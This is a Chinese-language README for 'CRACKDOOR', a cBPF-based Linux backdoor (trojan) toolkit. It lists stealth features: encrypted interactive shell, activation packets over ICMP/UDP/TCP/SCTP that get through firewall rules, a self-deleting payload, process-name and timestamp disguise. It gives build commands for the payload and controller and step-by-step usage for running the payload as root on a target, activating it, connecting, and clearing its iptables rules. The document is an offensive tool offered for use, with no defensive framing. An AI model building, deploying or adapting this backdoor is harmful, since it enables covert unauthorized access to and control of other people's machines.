# CRACKDOOR 

:secret:*结合简单隐藏机制，支持TLS标准混合加密的cBPF后门套件*:no_entry:



## 支持特性

- 通信使用椭圆曲线密钥交换+AES-256加密+gmac消息验证码+额外防重放包序号（此功能在源码中可选，默认不开启）

- 交互式实时shell，可使用vim等命令行工具并查看实时回显，支持高亮与格式化输出，可根据目标机情况切换shell解释器类型

- cBPF filter接收多种网络层协议的激活指令包，通信自动重定向到合法端口，穿透防火墙拦截规则

- 自删除的payload文件

- 释放pidfile，通过文件互斥锁防多开，payload若崩溃或退出自动删除pidfile并解锁

- 进程名伪装

- payload文件时间戳伪装

- 自动杀死自身僵尸子进程

  

## 源码结构

`cdoor_sender.py`: 	发送激活数据包，激活cdoor功能。

`srv.c`: 	木马payload。

`cli.c`: 	木马控制端。

`bpf.txt`:	payload所使用的cBPF filter汇编代码。



## 安装依赖

### OPENSSL 1.1.x 

```bash
sudo apt install libssl-dev
```

或编译安装github release：

https://github.com/openssl/openssl/tags

### PYTHON MODULES

```bash
sudo pip3 install termcolor
```



## 编译

### 静态编译：（payload）

```bash
gcc srv.c -Os -s -Wl,-Bstatic -lutil -lcrypto -Wl,-Bdynamic -o crackdoor -Wl,--no-as-needed -ldl -lpthread
```

以上静态链接不包括glibc。（本机编译测试，payload大小约2.5mb）

### 动态编译：（控制端,带调试符号）

```bash
gcc cli.c -o client -lutil -crypto -ggdb -O0
```



## 使用

### 1.以root权限在目标机运行payload

### 2.使用sender发送激活包

```bash
sudo python3 sender.py --dst_ip 192.168.0.1 --dst_port 22 --pwd 1 --protocol ICMP
```

参数中可选择要连接的目标ip，目标端口，激活选项与激活包协议：

【1】目标端口（`--dst_port`）可以是任何合法端口，即使该端口已经有服务在运行

【2】激活选项（`--pwd`）决定要发送的激活密码，1为激活shell连接，2为删除目标机上payload设置的iptables规则，3命令payload回连主机，发送在线信号（单个字符‘a’）

【3】激活包协议可选择ICMP,UDP,TCP,SCTP四种；激活包结构与内容可在sender脚本中随时更改。

### 3.控制端连接目标机器

```bash
sudo ./client 192.168.0.1 22
```

输入`exit`指令退出交互shell环境。

（注：直接运行`ps aux`或`netstat`（无额外参数）这类有大量终端格式化字符输出的命令有几率导致控制端崩溃，重新打开控制端连接即可；如有需要，尽量使用文件重定向或加额外参数缩小输出，显示文本文件不会导致崩溃）

### 4.（可选）删除目标机与payload相关的iptables规则

```bash
sudo python3 sender.py --dst_ip 192.168.0.1 --dst_port 22 --pwd 2 --protocol SCTP
```

​        （注：应保持端口号与激活时一致。）

